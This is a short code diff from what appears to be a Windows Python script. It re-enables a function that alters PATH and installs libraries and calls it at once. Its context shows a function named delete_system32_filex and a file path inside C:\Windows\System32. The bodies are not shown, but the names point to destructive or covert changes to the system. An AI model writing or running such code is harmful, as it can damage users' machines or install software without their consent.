@@ -26,7 +26,7 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
-'''
+
 def add_path_and_install_libraries():
     try:
         username = os.getenv('USERNAME')
@@ -66,7 +66,7 @@ def add_path_and_install_libraries():
     except Exception as e:
         print(f"An error occurred: {e}")
 add_path_and_install_libraries()
-'''
+
 
 os.system('cls')
 pathx = r'C:\Windows\System32\validate.nsh'
